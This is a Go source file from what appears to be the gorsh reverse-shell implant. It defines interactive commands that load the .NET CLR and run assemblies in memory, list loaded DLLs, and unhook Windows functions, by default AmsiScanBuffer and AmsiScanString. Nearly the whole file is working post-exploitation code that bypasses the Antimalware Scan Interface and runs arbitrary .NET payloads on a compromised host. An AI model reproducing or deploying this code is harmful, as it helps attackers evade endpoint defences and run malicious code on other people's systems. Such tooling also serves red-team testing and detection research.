package cmds

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/audibleblink/gorsh/internal/execute_assembly"

	"github.com/abiosoft/ishell"
)

var (
	clr      = execute_assembly.CLR{}
	hostname string
)

func UnloadAssembly(c *ishell.Context) {
	clr.Active = ""
	ResetPrompt(c)
}

func LoadAssembly(c *ishell.Context) {
	if len(c.Args) == 0 {
		assys := c.Cmd.Completer([]string{})
		for _, assy := range assys {
			c.Println(assy)
		}
		return
	}

	name := c.Args[0]
	var err error

	if !clr.IsLoaded() {
		clr, err = execute_assembly.NewCLR()
		clr, err = clr.LoadCLR() //HACK
		if err != nil {
			c.Printf("could not load clr: %v\n", err)
			return
		}
	}

	err = clr.Load(name)
	if err != nil {
		c.Printf("could not load %s: %s\n", name, err)
		return
	}

	ChangePrompt(c, name)
}

func ExecuteAssembly(c *ishell.Context) {
	if clr.Active == "" {
		c.Println("no assembly is currently loaded")
		return
	}
	stdout, stderr := clr.Execute(c.Args)
	c.Println(stdout)
	c.Println(stderr)
}

func ResetPrompt(c *ishell.Context) {
	c.SetPrompt(fmt.Sprintf("[%s]> ", GetHostname()))
}

func ChangePrompt(c *ishell.Context, module string) {
	c.SetPrompt(fmt.Sprintf("[%s] %s > ", GetHostname(), module))
}

func ListDlls(c *ishell.Context) {
	dlls, err := execute_assembly.ListDll()
	if err != nil {
		c.Println(err)
		return
	}

	for _, dll := range dlls {
		c.Println(dll)
	}
}

func Unhook(c *ishell.Context) {

	defs := make(map[string][]string)
	defs["amsi"] = []string{
		"AmsiScanBuffer",
		"AmsiScanString",
	}

	defs["version"] = []string{
		"VerifyVersionInfoA",
		"VerifyVersionInfoW",
	}

	if len(c.Args) == 0 {
		c.Println("Choices:\n")
		b, _ := json.MarshalIndent(defs, "", " ")
		c.Println(string(b))
		c.Println("\nOr 'modname.procname'")
		return
	}

	unhook := func(module string) func(string) {
		return func(fn string) {
			dll, err := execute_assembly.UnhookFunction(module, fn)
			if err == io.EOF {
				c.Println("nothing to unhook")
				return
			}
			if err != nil {
				c.Printf("failed to unhook %s: %v\n", fn, err)
				return
			}
			c.Printf(
				"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
				fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress,
			)
		}
	}

	choice := defs[c.Args[0]]

	if choice != nil {
		modUnhook := unhook(c.Args[0])
		for _, fn := range choice {
			modUnhook(fn)
		}
	} else {
		arg := strings.Split(c.Args[0], ".")
		unhook(fmt.Sprintf("%s.dll", arg[0]))(arg[1])
	}
}

func GetHostname() string {
	if hostname != "" {
		return hostname
	}
	hostname, _ = os.Hostname()
	return hostname
}
